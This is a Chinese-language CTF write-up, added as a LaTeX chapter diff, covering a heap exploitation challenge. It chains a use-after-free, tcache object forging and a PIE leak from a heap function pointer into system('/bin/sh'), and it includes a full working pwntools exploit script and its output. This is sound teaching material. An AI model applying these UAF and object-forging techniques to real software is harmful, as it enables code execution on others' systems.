@@ -1,0 +1,448 @@
+\section{第四題：soul-vault-collector}
+\label{chap:vault}
+
+這是五題裡我認為最漂亮的一題。它的難點不是漏洞本身，而是：
+
+\begin{keybox}[題目刻意不給你任何位址洩漏]
+整支程式\textbf{沒有任何 \code{\%p}}。你唯一能 leak 的是 heap 位址，
+而第二章已經證明\textbf{heap 基底和 PIE 基底是獨立的}。
+但你要呼叫的 \code{system@plt} 在 PIE 裡。
+
+所以問題變成：\textbf{能不能只用 heap 上的資料，挖出一個程式碼位址？}
+答案是可以，而且手法非常乾淨。
+\end{keybox}
+
+\subsection{防禦機制與選單}
+
+\begin{lstlisting}[style=raw]
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+\end{lstlisting}
+
+\begin{lstlisting}[style=raw]
+1. Capture Soul     2. Inspect Soul     3. Release Soul
+4. Rename Soul      5. Enter Soul Stone  6. Exit
+\end{lstlisting}
+
+\begin{warnbox}[先確認選單編號和實際行為一致]
+我實測過：\code{2} 真的是 Inspect（會印 \code{--- Vessel [n] ---}），
+\code{3} 真的是 Release（會印 \code{[+] Soul released back to the ether.}）。
+\textbf{和選單上寫的一致}。寫 exploit 之前先花三十秒確認這件事，
+比事後懷疑人生便宜很多。
+\end{warnbox}
+
+\subsection{Soul 的長相}
+
+\code{capture\_soul} 是 \code{malloc(0x38)}（$\Rightarrow$ chunk size \code{0x40}）：
+
+\begin{longtable}{@{}p{3.0cm}p{2.6cm}p{9.4cm}@{}}
+\toprule
+\textbf{欄位} & \textbf{偏移} & \textbf{說明}\\
+\midrule
+\endhead
+\code{name}     & \code{+0x00} & \code{read\_string(soul, 0x1f)}，最多 0x1f bytes。\\
+\code{memory}   & \code{+0x20} & \textbf{指標}，指向 \code{malloc(mem\_size)} 的另一塊。\\
+\code{callback} & \code{+0x28} & \textbf{函式指標}，預設是 \code{stone\_callbacks[stone\_state \% 6]}。\\
+\code{id}       & \code{+0x30} & \code{int}，值為 \code{index + 0x1337}。\\
+\code{mem\_size}& \code{+0x34} & \code{int}，記憶體大小（1 \verb|~| 0x400，否則預設 0x40）。\\
+\bottomrule
+\end{longtable}
+
+\begin{keybox}[記住兩件事]
+\begin{enumerate}[leftmargin=1.4em,itemsep=1pt]
+  \item \code{memory} 那塊是\textbf{另外一次 \code{malloc}}，所以一次 capture 會配兩塊：
+        \code{0x40}（結構）與 \code{mem\_size} 對應的大小（記憶體）。
+  \item \code{+0x28} 是函式指標，而 \code{inspect\_soul} 會\textbf{直接呼叫它}。
+\end{enumerate}
+\end{keybox}
+
+\subsection{三個 bug}
+
+\subsubsection{bug 1：\code{release\_soul} 不把指標清掉 $\Rightarrow$ UAF}
+
+\begin{lstlisting}[style=asm]
+  1988:  mov    rax,[rbp-0x8]        ; rax = soul
+  198c:  mov    rax,[rax+0x20]       ; soul->memory
+  1990:  test   rax,rax
+  1993:  je     19a5                 ; NULL 就跳過
+  19a0:  call   free@plt             ; free(soul->memory)
+  19a5:  mov    rax,[rbp-0x8]
+  19ac:  call   free@plt             ; free(soul)
+  19b1:  mov    eax,[sacrifice_count]
+  ...                                ; sacrifice_count++  （然後就結束了）
+\end{lstlisting}
+
+\textbf{沒有任何一行把 \code{souls[idx]} 設成 NULL。}
+所以 release 之後 \code{souls[idx]} 還是懸空指標，而且\textbf{兩塊 chunk 都被 free 了}
+（結構與 memory）——UAF 的範圍比 soul-archive 那題更大。
+
+\subsubsection{bug 2：\code{capture\_soul} 把輸入寫進 \code{soul->memory} 指的地方}
+
+\begin{lstlisting}[style=asm]
+  16d7:  call   malloc@plt            ; malloc(mem_size) -> soul->memory
+  16e3:  mov    [rax+0x20],rdx
+  ...
+  1732:  mov    eax,[rbp-0xc]
+  1735:  sub    eax,0x1               ; size - 1
+  173e:  mov    rax,[rax+0x20]        ; rax = soul->memory
+  1747:  call   read_string           ; <== 把我們輸入的字串寫到 *soul->memory*
+\end{lstlisting}
+
+這句話要讀三次：\textbf{「寫入的目的地是一個 \code{malloc} 回來的指標」。}
+如果我能讓那次 \code{malloc} 回傳\textbf{別的物件}的位址，
+我就能把那個物件的欄位\textbf{任意改寫}。
+
+\subsubsection{bug 3：\code{inspect\_soul} 是任意讀 + 任意呼叫}
+
+\begin{lstlisting}[style=asm]
+  18bd:  mov    rax,[rax+0x20]       ; soul->memory
+  18c1:  test   rax,rax
+  18c4:  je     ...                  ; NULL 就跳過
+  18e0:  call   printf@plt           ; printf("Memory: %s", soul->memory)
+  18e9:  mov    rax,[rax+0x28]       ; soul->callback
+  18ed:  test   rax,rax
+  18f0:  je     ...                  ; NULL 就跳過
+  1901:  call   rdx                  ; <== 呼叫 soul->callback(soul)
+\end{lstlisting}
+
+\begin{keybox}[把三個 bug 串起來]
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
+  \item \textbf{任意讀}：\code{printf("\%s", soul->memory)}——只要我能改 \code{memory}，
+        就能讀\textbf{任意位址}的字串。
+  \item \textbf{任意呼叫}：\code{callback(soul)}，且 \code{rdi = soul}。
+  \item \textbf{任意寫}：capture 時把資料寫到 \code{soul->memory} 指的地方。
+\end{itemize}
+三個都是「指標由我決定」。剩下的問題只有一個：\textbf{怎麼決定？}
+\end{keybox}
+
+\subsection{第一步：從 heap 上 leak 出 heap 基底}
+
+UAF 給你一個讀 dangling 結構的能力。\code{release(1)} 之後，
+\code{souls[1]} 那塊 chunk 的\textbf{前 8 bytes（也就是 \code{name}）}已經被 tcache 的 \code{fd} 佔用：
+
+\begin{lstlisting}[style=raw]
+--- Vessel [1] ---
+Name: \x1c(\x83Z\x05            <-- 這是 fd，不是名字了
+\end{lstlisting}
+
+因為 safe-linking（見 \ref{sec:safelink}），\code{fd = NULL \^{} (chunk >> 12)}，
+所以 \code{fd} 本身就是 \textbf{chunk 位址 $\gg$ 12}。於是：
+
+\begin{lstlisting}[style=py]
+raw  = re.search(rb'Name: ([^\n]*)\n', out).group(1)   # 只會拿到 5 bytes
+l    = u64(raw.ljust(8, b'\x00'))
+heap = l << 12
+\end{lstlisting}
+
+\begin{lstlisting}[style=raw]
+[+] heap = 0x5616bbddd000   souls[0] = 0x5616bbddd2a0   souls[1] = 0x5616bbddd310
+\end{lstlisting}
+
+\begin{keybox}[\code{0x2a0} 與 \code{0x310} 是怎麼來的]
+一次 capture 配兩塊：結構 \code{0x40}、記憶體 \code{0x30}（\code{mem\_size=0x20}），共 \code{0x70}。
+
+\begin{lstlisting}[style=raw]
+heap + 0x290   第一塊 chunk 的標頭（前面 0x290 是 tcache_perthread_struct）
+heap + 0x2a0   souls[0] 的結構      (chunk 0x40)
+heap + 0x2d0   souls[0]->memory     的標頭 (chunk 0x30)
+heap + 0x300   souls[1] 結構的標頭
+heap + 0x310   souls[1]                <-- 0x2a0 + 0x70
+heap + 0x340   souls[1]->memory 的標頭
+\end{lstlisting}
+
+\textbf{這張圖要背下來}，整題都靠它。這兩個數字建議用 gdb 對一次
+（\code{p \&souls}、\code{x/8gx \&souls}），確認你的 libc 版本下不會有差異。
+\end{keybox}
+
+\subsection{第二步：讓 \code{malloc} 把記憶體配到「別的 Soul」身上}
+
+現在關鍵動作。tcache 是 LIFO，所以\textbf{我們能預測第幾次 \code{malloc} 會拿到哪一塊}。
+
+\begin{longtable}{@{}p{1.2cm}p{5.4cm}p{8.4cm}@{}}
+\toprule
+\textbf{步} & \textbf{動作} & \textbf{tcache[0x40] 的狀態（左邊是頭）}\\
+\midrule
+\endhead
+a & \code{release(1)} & \code{[S1]}（\code{S1} = \code{0x300} 那塊）\\
+b & \code{release(0)} & \code{[S0, S1]}\\
+c & \code{capture(size=0x38)} 的\textbf{結構} malloc & 彈出 \code{S0} $\Rightarrow$ 這是新 soul 的結構\\
+d & \code{capture(size=0x38)} 的\textbf{記憶體} malloc & 彈出 \textbf{\code{S1}} $\Rightarrow$ \code{soul->memory = 0x310}\\
+\bottomrule
+\end{longtable}
+
+\begin{keybox}[看到了嗎？]
+第 d 步之後，\code{soul->memory} 剛好等於 \textbf{\code{souls[1]} 的位址}——
+那個還懸空指著的舊 Soul。而第 e 步 \code{read\_string(soul->memory, size-1)}
+就會把我們輸入的內容\textbf{寫進 \code{souls[1]} 的每一個欄位}。
+
+\textbf{這就是偽造物件的手法}：不是「找到一個可以寫的地方」，
+而是\textbf{讓一個本來要寫進 buffer 的寫入，落到另一個物件的欄位上}。
+\end{keybox}
+
+\subsection{第三步：forge \#1 —— 用「讀字串」偷出 PIE}
+
+先把 \code{souls[1]} 改造成「一台讀取機」：
+
+\begin{lstlisting}[style=py]
+forge1  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)   # name   (+0x00) = "/bin/sh"
+forge1 += p64(s0 + 0x28)                          # memory (+0x20) -> soul2->callback
+forge1 += p64(0)                                  # callback(+0x28) = 0（先不要呼叫）
+forge1 += p32(0) + p32(0)                         # id, mem_size
+assert len(forge1) == 0x38
+capture_raw(0x38, b'C', forge1[:-1])              # 0x37 bytes + read_string 自動補的 NUL
+\end{lstlisting}
+
+\begin{whybox}[\code{memory = s0 + 0x28} 是什麼意思？]
+\code{s0} 是 \code{souls[0]}（也就是剛剛被新 soul 回收的那塊，\code{heap+0x2a0}）。
+\code{s0 + 0x28} 就是那個結構的 \code{callback} 欄位。
+
+而那個 \code{callback} 裡裝的是\textbf{一個程式碼位址}——
+\code{capture\_soul} 會把 \code{stone\_callbacks[stone\_state \% 6]} 寫進去，
+而 \code{stone\_callbacks[0]} 就是 \code{callback\_soul}：
+
+\begin{lstlisting}[style=raw]
+$ nm soul_vault_patched | grep -E 'stone_callbacks|callback_soul'
+0000000000004020 D stone_callbacks
+0000000000001289 T callback_soul
+\end{lstlisting}
+
+所以 \code{souls[0]+\^{}0x28} 這個位置存著 \code{PIE + 0x1289}。
+我把 \code{souls[1]->memory} 指向它，再用 \code{inspect(1)} 的
+\code{printf("Memory: \%s")} 把它\textbf{當字串印出來}——
+
+\begin{lstlisting}[style=raw]
+Memory: \x89\x12\xc1\x5b\x16\x00      <-- 6 bytes，因為第 7 個 byte 是 0x00
+\end{lstlisting}
+
+$\Rightarrow$ \code{pie = leak - 0x1289}，而且驗算 \code{pie \& 0xfff == 0} 一定成立。
+\end{whybox}
+
+\begin{keybox}[這一段是整題的精華]
+我沒有 \code{\%p}，但我有\textbf{一個能讀任意位址字串的原語}，
+而 heap 上\textbf{剛好躺著一個程式碼位址}。
+把這兩件事接起來，就得到了 PIE base。
+
+\textbf{通用心法}：找不到 leak 的時候，問「有沒有哪裡已經存著我要的東西？」
+——heap 上的函式指標、libc 在 heap 上的殘留、\code{stdout} 的 \code{\_IO\_2\_1\_stdout\_} 指標……
+都是常見的寶庫。
+\end{keybox}
+
+\subsection{第四步：forge \#2 —— 把 callback 換成 \code{system@plt}}
+
+\begin{lstlisting}[style=py]
+release(2)                                        # 再一次把 S0/S1 放回 tcache[0x40]
+forge2  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)
+forge2 += p64(0)                                  # memory = 0（跳過 printf）
+forge2 += p64(pie + SYSTEM_PLT)                   # callback = system@plt
+forge2 += p32(0) + p32(0)
+capture_raw(0x38, b'D', forge2[:-1])
+inspect(1)                                        # -> call [soul+0x28](soul)
+\end{lstlisting}
+
+最後 \code{inspect(1)} 執行到 \code{call rdx} 時：
+
+\begin{lstlisting}[style=raw]
+rdx = souls[1]->callback = system@plt
+rdi = souls[1]                         <-- 而 souls[1] 的內容是 "/bin/sh"
+=> system("/bin/sh")
+\end{lstlisting}
+
+\begin{keybox}[為什麼 \code{name} 要放 \code{"/bin/sh"}]
+因為 \code{rdi} 被硬寫成 \code{soul} 自己（\code{mov rdi,rax}，\code{rax = soul}）。
+我沒辦法控制 \code{rdi} 指向別的地方，\textbf{那我就把 \code{soul} 本身變成 \code{"/bin/sh"} 字串}。
+\code{name} 就在結構的最前面（\code{+0x00}），所以 \code{soul} 這個位址上的 C 字串就是 \code{"/bin/sh"}。
+\end{keybox}
+
+\begin{warnbox}[\code{system@plt} 是 \code{0x1120} 還是 \code{0x1124}？]
+\code{ELF.plt['system']} 回報 \code{0x1124}，但 \code{objdump} 顯示：
+
+\begin{lstlisting}[style=asm]
+  1120:  endbr64
+  1124:  bnd jmp QWORD PTR [rip+0x2e6d]
+\end{lstlisting}
+
+\code{0x1124} 是 \code{bnd jmp}，也就是「跳過 \code{endbr64}」。
+如果哪天 CET/IBT 真的被啟用，跳到沒有 \code{endbr64} 的位址會被擋下來。
+所以腳本裡寫死 \code{0x1120}（從 \code{endbr64} 進去），並用 \code{assert} 確認兩個值之一：
+
+\begin{lstlisting}[style=py]
+SYSTEM_PLT = 0x1120
+assert elf.plt['system'] in (0x1120, 0x1124), hex(elf.plt['system'])
+\end{lstlisting}
+\end{warnbox}
+
+\subsection{完整的 heap 佈局圖（動手前先畫這張）}
+
+\begin{lstlisting}[style=raw]
+heap + 0x000  tcache_perthread_struct (0x290)
+
+--- 兩次 capture(size=0x20) 之後 ---
+heap + 0x290  [S0] 結構 chunk 0x40   -> souls[0] = 0x2a0
+heap + 0x2d0  [M0] memory chunk 0x30
+heap + 0x300  [S1] 結構 chunk 0x40   -> souls[1] = 0x310
+heap + 0x340  [M1] memory chunk 0x30
+
+--- release(1); release(0) 之後 ---
+tcache[0x30] = M0, M1
+tcache[0x40] = S0, S1        (頭是 S0)
+
+--- capture(size=0x38)：結構彈 S0，記憶體彈 S1 ---
+soul2 = 0x2a0
+soul2->memory = 0x310  ==  souls[1]   <-- 偽造寫入的落點
+\end{lstlisting}
+
+\subsection{完整腳本}
+
+\begin{lstlisting}[style=py]
+#!/usr/bin/env python3
+"""soul-vault-collector: UAF -> heap leak -> forged Soul -> PIE leak -> shell"""
+import os, re, sys
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
+BIN  = os.path.join(ROOT, 'solve/vault/soul_vault_patched')
+elf  = ELF(BIN, checksec=False)
+
+CALLBACK_SOUL = 0x1289        # stone_callbacks[0] -> callback_soul
+SYSTEM_PLT    = 0x1120        # system@plt，從 endbr64 進去
+assert elf.plt['system'] in (0x1120, 0x1124)
+
+S0_OFF = 0x2a0                # souls[0] - heap
+S1_OFF = 0x310                # souls[1] - heap
+
+def start():
+    return process(BIN, cwd=os.path.dirname(BIN))
+
+def exploit(io):
+    io.recvuntil(b'Choice: ')
+
+    def capture_raw(size, name, blob, term=True):
+        io.sendline(b'1')
+        io.sendlineafter(b'Enter Soul Name: ', name)
+        io.sendlineafter(b'Enter Memory Size (max 1024): ', str(size).encode())
+        io.recvuntil(b'Inscribe Memory: ')
+        io.send(blob)
+        if term:
+            io.sendline(b'')
+        io.recvuntil(b'Choice: ')
+
+    def release(idx):
+        io.sendline(b'3')                 # 3 = release
+        io.sendlineafter(b'Enter vessel index (0-7): ', str(idx).encode())
+        io.recvuntil(b'Choice: ')
+
+    def inspect(idx):
+        io.sendline(b'2')                 # 2 = inspect
+        io.sendlineafter(b'Enter vessel index (0-7): ', str(idx).encode())
+        return io.recvuntil(b'Choice: ')
+
+    # ---- 1. 兩個 soul（memory 各 0x20）----
+    capture_raw(0x20, b'A', b'aaaa\n')
+    capture_raw(0x20, b'B', b'bbbb\n')
+
+    # ---- 2. 從 UAF 的 name 讀 tcache fd，反推 heap ----
+    release(1)
+    out = inspect(1)
+    raw = re.search(rb'Name: ([^\n]*)\n', out).group(1)
+    if len(raw) != 5:
+        raise RuntimeError('bad heap leak (%d bytes)' % len(raw))
+    heap = u64(raw.ljust(8, b'\x00')) << 12
+    s0, s1 = heap + S0_OFF, heap + S1_OFF
+    assert s1 >> 12 == heap >> 12
+    log.success('heap = %#x  souls[0] = %#x  souls[1] = %#x', heap, s0, s1)
+
+    # ---- 3. 讓 tcache[0x40] = [S0, S1] ----
+    release(0)
+
+    # ---- 4. forge #1：把 souls[1] 變成一台讀取機，偷 PIE ----
+    forge1  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)
+    forge1 += p64(s0 + 0x28)          # memory -> soul2->callback（裡面是 PIE+0x1289）
+    forge1 += p64(0)                  # callback = 0（先不要呼叫）
+    forge1 += p32(0) + p32(0)
+    capture_raw(0x38, b'C', forge1[:-1])
+
+    out  = inspect(1)
+    raw  = re.search(rb'Memory: ([^\n]*)\n', out).group(1)
+    if len(raw) != 6:
+        raise RuntimeError('bad PIE leak (%d bytes)' % len(raw))
+    pie  = u64(raw.ljust(8, b'\x00')) - CALLBACK_SOUL
+    assert pie & 0xfff == 0, 'PIE base not page aligned'
+    log.success('callback leak -> PIE base = %#x', pie)
+
+    # ---- 5. 再一次把 S0/S1 放回 tcache ----
+    release(2)
+
+    # ---- 6. forge #2：callback = system@plt ----
+    forge2  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)
+    forge2 += p64(0)
+    forge2 += p64(pie + SYSTEM_PLT)
+    forge2 += p32(0) + p32(0)
+    capture_raw(0x38, b'D', forge2[:-1])
+
+    # ---- 7. inspect(1) -> system("/bin/sh") ----
+    io.sendline(b'2')
+    io.sendlineafter(b'Enter vessel index (0-7): ', b'1')
+    return io
+
+for attempt in range(10):
+    io = start()
+    try:
+        io = exploit(io); break
+    except Exception as e:                 # leak 被 0x00 截斷等情況 -> 重試
+        log.warning('attempt %d failed: %s', attempt, e); io.close()
+
+io.sendline(b'cat flag.txt flag /flag* 2>/dev/null; id')
+print(io.revrepeat(2).decode(errors='replace'))
+\end{lstlisting}
+
+\begin{keybox}[為什麼要有 \code{for attempt in range(10)} 的重試迴圈]
+\code{fd} 的高位 byte 是 \code{0x00}，但 ASLR 的位址有機率讓\textbf{中間}某個 byte 也是 \code{0x00}
+（例如位址是 \code{0x55ab00...}）。那時候字串會提早結束，你只會拿到 3\textasciitilde4 bytes。
+\textbf{這不是 bug，是機率}。寫個重試迴圈，或改用 \code{recvuntil} 精確讀固定長度。
+\end{keybox}
+
+\subsection{執行結果}
+
+\begin{lstlisting}[style=raw]
+[+] heap = 0x5616bbddd000   souls[0] = 0x5616bbddd2a0   souls[1] = 0x5616bbddd310
+[+] callback leak = 0x56168bb96289  ->  PIE base = 0x56168bb95000
+[*] forged Soul @ 0x5616bbddd310 : name="/bin/sh" callback=system@plt (0x56168bb96120)
+
+--- Vessel [1] ---
+Name: /bin/sh
+ID: 0x0
+OWASP{local_test_flag_soul_vault}
+uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),954(libvirt),958(docker),960(ollama),998(wheel)
+
+[+] FLAG = OWASP{local_test_flag_soul_vault}
+\end{lstlisting}
+
+\begin{keybox}[注意 \code{--- Vessel [1] ---} 這行]
+它是在 \code{system} \textbf{之前}印的，而 \code{Memory:} 那行不見了——
+因為我們把 \code{memory} 設成 \code{0}，\code{printf} 被跳過了（腳本裡刻意如此）。
+接著 \code{call rdx} 就跳進 \code{system}，然後 flag 的內容就從 shell 裡被 \code{cat} 出來。
+\end{keybox}
+
+\begin{keybox}[最後一步為什麼用 \code{revrepeat} 而不是 \code{recvuntil}]
+因為 \code{/bin/sh} 進去之後\textbf{不會再回到選單}，\code{recvuntil(b'Choice: ')} 會逾時。
+用 \code{io.revrepeat(2)} 把剩下的輸出全部收乾淨就好。
+\textbf{拿到 shell 之後的互動，和一般選單題的收尾方式不一樣，這點要記得。}
+\end{keybox}
+
+\subsection{這一題要帶走的三件事}
+
+\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
+  \item \textbf{「寫入到一個指標指的地方」是最強的漏洞型態}。
+        \code{read\_string(soul->memory, n)} 本身沒錯，
+        錯的是 \code{soul->memory} 可以是別人的記憶體。
+        \textbf{看到「先 malloc 再寫進去」的函式，就要想「這次 malloc 會回傳哪一塊」。}
+  \item \textbf{沒有 \code{\%p} 不代表沒有 leak}。
+        有「讀任意字串」的原語 + heap 上躺著一個 code pointer $=$ PIE base。
+  \item \textbf{heap 與 PIE 的基底無關}（第二章的實測表），
+        所以這題一定要走「從 heap 挖出 PIE」這條路，不能偷懶。
+\end{enumerate}
